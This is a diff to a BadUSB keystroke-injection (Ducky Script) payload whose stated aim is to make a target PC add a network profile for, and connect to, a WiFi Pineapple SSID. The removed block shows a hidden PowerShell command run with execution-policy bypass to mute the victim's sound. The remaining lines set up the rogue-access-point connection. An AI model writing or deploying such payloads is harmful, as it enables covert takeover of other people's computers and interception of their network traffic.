@@ -2,15 +2,6 @@ REM This payload is meant to use powershell to add the network profile of your w
 
 DELAY 1000
 
-REM This first snippet will mute their sytem sound
-
-GUI r 
-DELAY 500
-STRING powershell -w h -NoP -NonI -Exec Bypass $k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 174)}
-DELAY 500
-ENTER
-DELAY 500
-
 REM If the wifi pineapple SSID is detected target PC will connect to it  
 
 REM IF_PRESENT SSID="PineApple"
